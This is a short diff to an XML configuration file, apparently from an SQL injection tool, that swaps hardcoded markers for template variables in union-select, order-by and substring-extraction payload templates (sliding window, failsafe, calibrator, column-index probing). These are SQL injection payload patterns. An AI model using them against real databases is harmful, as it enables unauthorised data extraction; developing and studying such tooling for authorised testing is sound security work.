@@ -86,16 +86,16 @@ from (
     <strategy>
         <configuration>
             <slidingWindow>
-select 'SQLi' %26 substring(r,${INDEX},65536)r from(${INJECTION})x
+select '${LEAD}' %26 substring(r,${INDEX},65536)r from(${INJECTION})x
             </slidingWindow>
             <limit> having count(*) between ${LIMIT} and ${LIMIT}</limit>
-            <failsafe>select ''%26(1337${INDICE}7330%2b1) from dual</failsafe>
-            <calibrator>string(65536, '%23')</calibrator>
+            <failsafe>select ''%26(1337${INDICE}7330%2b1)r from dual</failsafe>
+            <calibrator>string(65536, '${CALIBRATOR_SQL}')</calibrator>
             <limitBoundary>1</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${STARS} from(${INDICES_STARS})</indices>
-            <capacity>(select'SQLi${INDICE}'%26${CALIBRATOR}%26'iLQS'from dual)</capacity>
+            <indices> union select ${RESULT_RANGE} from(${INDICE_UNIQUE})</indices>
+            <capacity>(select'${LEAD}${INDICE}'%26${CALIBRATOR}from dual)</capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
     </strategy>
